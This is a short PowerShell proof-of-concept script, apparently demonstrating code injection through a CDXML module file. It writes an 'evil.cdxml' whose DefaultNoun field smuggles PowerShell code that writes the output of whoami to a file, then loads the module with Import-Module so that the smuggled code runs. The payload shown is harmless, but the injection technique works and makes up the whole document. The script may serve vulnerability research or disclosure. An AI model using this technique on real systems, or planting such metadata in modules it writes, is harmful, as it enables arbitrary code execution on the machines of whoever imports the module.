$root = 'C:\Users\Public\cdxml-poc'

New-Item -ItemType Directory -Path $root -Force | Out-Null
Remove-Item "$root\evil.txt" -Force -ErrorAction SilentlyContinue

@'
<?xml version="1.0" encoding="utf-8"?>
<PowerShellMetadata xmlns="http://schemas.microsoft.com/cmdlets-over-objects/2009/11">
 <Class ClassName="ROOT/cimv2/Win32_Process">
   <Version>1.0.0.0</Version>
   <DefaultNoun>Inj { }; [System.IO.File]::WriteAllText('C:\Users\Public\cdxml-poc\evil.txt', ('Hello From ' + (whoami))); function Dummy</DefaultNoun>
   <InstanceCmdlets>
     <GetCmdletParameters DefaultCmdletParameterSet="DefaultSet" />
   </InstanceCmdlets>
 </Class>
</PowerShellMetadata>
'@ | Set-Content "$root\evil.cdxml" -Encoding UTF8

Import-Module "$root\evil.cdxml" -Force -ErrorAction Stop
